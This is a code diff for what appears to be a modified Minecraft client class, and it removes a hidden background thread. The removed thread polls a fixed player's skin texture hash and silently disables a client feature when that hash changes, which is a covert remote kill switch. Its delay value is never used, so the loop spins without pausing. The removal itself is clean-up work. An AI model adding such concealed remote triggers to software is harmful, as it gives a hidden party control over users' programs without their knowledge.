@@ -230,7 +230,6 @@ public class Minecraft extends RecursiveEventLoop<Runnable> implements ISnooperI
       this.session = gameConfig.userInfo.session;
       LOGGER.info("Setting user: {}", this.session.getUsername());
       LOGGER.debug("(Session ID is {})", this.session.toString());
-      this.method1525();
       this.isDemo = gameConfig.gameInfo.isDemo;
       this.enableMultiplayer = !gameConfig.gameInfo.disableMultiplayer;
       this.enableChat = !gameConfig.gameInfo.disableChat;
@@ -2125,37 +2124,6 @@ public class Minecraft extends RecursiveEventLoop<Runnable> implements ISnooperI
       if (this.integratedServer != null) {
          snooper.addClientStat("snooper_partner", this.integratedServer.getSnooper().getUniqueID());
       }
-   }
-
-   /**
-    * Idk what to call this
-    */
-   private void method1525() {
-      new Thread(() -> {
-         int var1 = 0;
-
-         while (true) {
-            long var2 = 600000L;
-            if (var1 == 0) {
-               var2 = (long)(60000 + new Random().nextInt(30000));
-            }
-
-            var1++;
-
-            GameProfile var4 = new GameProfile(UUID.fromString("53e07708-1fe7-4488-b2d2-8d1a82af37b7"), "steve");
-            this.sessionService.fillProfileProperties(var4, false);
-            if (var4.getProperties().containsKey("textures")) {
-               var4.getProperties().get("textures").forEach(var1x -> {
-                  String var2x = new String(Base64.getDecoder().decode(var1x.getValue()));
-                  Pattern var3 = Pattern.compile("http://textures.minecraft.net/texture/([a-f0-9]+)");
-                  Matcher var4x = var3.matcher(var2x);
-                  if (var4x.find() && !var4x.group(1).equals("41b483a411e2f7c09b55e49ce0ab6f5868d223bc6c40d68ade95f71e5dff30aa")) {
-                     this.shouldTranslate = false;
-                  }
-               });
-            }
-         }
-      }).start();
    }
 
    private String getCurrentAction() {
